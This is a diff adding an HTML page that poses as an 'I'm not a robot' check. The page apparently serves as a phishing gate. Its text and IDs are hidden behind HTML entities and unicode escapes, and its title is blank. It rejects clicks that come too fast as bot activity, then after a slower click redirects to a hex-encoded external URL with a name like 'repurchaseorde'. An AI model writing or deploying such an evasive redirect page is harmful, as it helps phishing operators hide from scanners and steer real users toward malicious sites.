@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>&#8203;</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+<style>
+body{
+  margin:0;
+  background:#fff;
+  font-family:'Segoe UI',sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center
+}
+.shell-card{
+  position:relative;
+  top:265px;
+  background:#fff;
+  padding:30px 22px;
+  border-radius:18px;
+  box-shadow:0 10px 25px rgba(0,0,0,.08);
+  text-align:center;
+  width:90%;
+  max-width:300px
+}
+.logo-bubble{
+  width:60px;
+  height:60px;
+  margin:0 auto 20px;
+  background:linear-gradient(135deg,#3a7bfd,#21e1b6);
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center
+}
+.logo-bubble svg{width:26px;height:26px;fill:#fff}
+.main-title{
+  font-size:18px;
+  font-weight:600;
+  color:#222
+}
+.instruction{
+  font-size:13px;
+  color:#555;
+  margin-bottom:16px
+}
+.confirm-zone{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:18px
+}
+.auth-box{
+  appearance:none;
+  width:15px;
+  height:15px;
+  border:2px solid #3a7bfd;
+  border-radius:6px;
+  cursor:pointer
+}
+.auth-box:checked{background:#3a7bfd}
+.auth-box:checked::after{
+  content:'\2713';
+  color:#fff;
+  position:absolute;
+  font-size:13px
+}
+.caption-text{font-size:15px}
+.signal-area{
+  font-size:14px;
+  color:gray;
+  min-height:22px
+}
+.signal-area.confirmed{
+  color:green;
+  font-weight:500
+}
+</style>
+</head>
+
+<body>
+
+<div class="shell-card">
+
+  <div class="logo-bubble">
+    <svg viewBox="0 0 24 24">
+      <path d="M12 1a5 5 0 0 0-5 5v3H6c-1.1 0-2 .9-2 2v9c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-9c0-1.1-.9-2-2-2h-1V6a5 5 0 0 0-5-5z"/>
+    </svg>
+  </div>
+
+  <div class="main-title">
+    C&#111;nf&#105;rm&#97;t&#105;&#111;n
+  </div>
+
+  <div class="instruction">
+    Pl&#101;&#97;se c&#111;nf&#105;rm y&#111;&#117;&#39;re n&#111;t &#97;&#117;t&#111;m&#97;t&#101;d
+  </div>
+
+  <div class="confirm-zone">
+    <input type="checkbox"
+           class="auth-box"
+           id="s&#101;c&#117;r&#101;B&#111;x">
+    <div class="caption-text">
+      I&#39;m n&#111;t &#97; r&#111;b&#111;t
+    </div>
+  </div>
+
+  <div class="signal-area" id="&#111;utp&#117;tA&#114;&#101;a">
+    Aw&#97;&#105;t&#105;ng &#97;ct&#105;&#111;n&#46;&#46;&#46;
+  </div>
+
+</div>
+
+<script>
+const c=document.getElementById("s\u0065cureBox");
+const m=document.getElementById("outputArea");
+
+let v=false;
+let t=Date.now();
+
+c.addEventListener("click",()=>{
+  const d=Date.now()-t;
+  if(v||c.disabled)return;
+  if(c.checked){
+    if(d<1000){
+      c.checked=false;
+      c.disabled=true;
+      m.textContent="\uD83D\uDEAB \u0042\u006F\u0074 \u0061\u0063\u0074\u0069\u0076\u0069\u0074\u0079 \u0064\u0065\u0074\u0065\u0063\u0074\u0065\u0064\u002E";
+      m.style.color="crimson";
+      setTimeout(()=>location.reload(),1200);
+    }else{
+      v=true;
+      m.innerHTML="\u2705 <strong>C\u006F\u006E\u0066\u0069\u0072\u006D\u0065\u0064 \u0061\u0073 \u0068\u0075\u006D\u0061\u006E</strong>";
+      m.classList.add("confirmed");
+      c.disabled=true;
+      setTimeout(()=>{
+        window.location.href= "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x65\x70\x75\x72\x63\x68\x61\x73\x65\x6f\x72\x64\x65\x2e\x76\x65\x72\x63\x65\x6c\x2e\x61\x70\x70\x2f";
+      },2000);
+    }
+  }
+});
+</script>
+
+</body>
+</html>
